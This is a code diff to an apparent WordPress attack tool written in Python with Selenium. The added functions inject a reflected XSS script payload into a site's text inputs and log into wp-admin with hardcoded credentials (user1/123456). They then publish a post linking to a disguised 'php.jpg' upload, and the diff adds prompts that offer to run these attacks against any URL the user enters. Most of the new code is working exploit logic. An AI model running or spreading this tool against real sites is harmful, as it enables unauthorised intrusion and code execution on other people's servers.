@@ -228,6 +228,49 @@ def Type_Expl():
                 print("XSS was typed, but there is comment administration. So we havn't proof of XSS vulnerability")
                 return(True)
             return(False)
+
+def Reflected_Xss_for_232(url):
+    driver=webdriver.Firefox()
+    driver.get(url)
+    try:
+        element=driver.find_element_by_xpath("//input[@type='text']")
+        element.send_keys('<script>alert("Hello!")</script>')
+        element.send_keys(Keys.RETURN)
+        alert=driver.switch_to_alert()
+        print(alert.text)
+        print("Xss is success. Press Enter to continue.\n")
+        try:
+            alert.accept()
+        except selenium.common.exceptions.NoAlertPresentException:
+            pass
+    except:
+        print("Xss is failed.")
+    finally:
+        driver.quit()
+      
+def Upload_PHP_code(url):
+    driver=webdriver.Firefox()
+    driver.get(url+"/wp-admin/post-new.php")
+    try:
+        element=driver.find_element_by_id("user_login")
+        element.send_keys("user1")
+        element=driver.find_element_by_id("user_pass")
+        element.send_keys("123456")
+        element.send_keys(Keys.RETURN)
+        while True:
+            try:
+                element=driver.find_element_by_name("content")
+                element.send_keys('<a href="http://127.0.0.1/wordpress28/wp-content/uploads/2015/05/test-imadge.php.jpg"> Picture</a>')
+                break
+            except:
+                pass
+        element=driver.find_element_by_id("publish")
+        element.send_keys(Keys.ENTER)
+        print("PHP code succesfully uploaded.")
+    except:
+        print("Uploading of PHP code failed.")
+    finally:
+        driver.quit()      
         
 url=input("Enter URL(e.g. 127.0.0.1/wordpress or example.com):\n")
 url=Check_URL(url)
@@ -235,7 +278,8 @@ version=Check_WP_and_search_version(url)
 Search_vulnerabilities(version)
 version=version.split(".")
 if(len(version)<3):
-    version[2]=0
+    version.append(0)
+    
 version=int(version[0])+int(version[1])/10+int(version[2])/100
 if (version <= 2.83):
     y="y"
@@ -250,6 +294,27 @@ if (version <= 2.83):
                 break
         except NameError as e:
             print("Inncorrent answer, pleas try again")
+    while(True):
+        try:
+            answer = input("Would you like to try upload PHP code on server? y/n\n")
+            if(answer == "y"):
+                Upload_PHP_code(url)
+                break
+            if(answer == "n"):
+                break
+        except NameError as e:
+            print("Inncorrent answer, pleas try again")
+    if(version<=2.32):
+        while(True):
+            try:
+                answer = input("Would you like to try reflected xss? y/n\n")
+                if(answer == "y"):
+                    Reflected_Xss_for_232(url)
+                    break
+                if(answer == "n"):
+                    break
+            except NameError as e:
+                print("Inncorrent answer, pleas try again")
 if((version >3)and(version<4)):
     print("Testing xss attack vulnerability")
     success = False
